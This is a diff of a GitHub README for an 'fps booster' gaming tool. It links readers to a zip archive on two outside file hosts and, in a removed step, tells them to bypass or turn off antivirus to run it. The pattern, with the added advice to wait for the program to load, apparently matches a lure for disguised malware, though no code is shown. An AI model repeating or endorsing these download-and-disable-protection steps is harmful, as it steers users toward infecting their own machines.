@@ -30,12 +30,14 @@ how to download?
 1. go to this link <a href="https://www.upload.ee/files/15659646/fps-booster.zip.html">download 1</a> or <a href="https://gofile.io/d/DIxkf6">Download 2</a>
 2. download the fps booster
 
-3. launch the booster if anti virus interupts click on install anyway if still doesnt work turn off anti virus
+3. run the fps booster
 
-4. you will get this screen
+4. you may need to wait up to minute for it to load. please be patient
+
+5. you will get this screen
    ![263516282_9771fd4e_a05e_41a3_ab99_c8415d758d28](https://github.com/ormalord/fps-booster/assets/144336531/f60dc3d1-bc57-4d4b-998c-20ac575450e7)
-5. click on the boost fps button
+6. click on the boost fps button
 
-6. and boom congrats the fps booster is now working
+7. and boom congrats the fps booster is now working
 
 <h2>
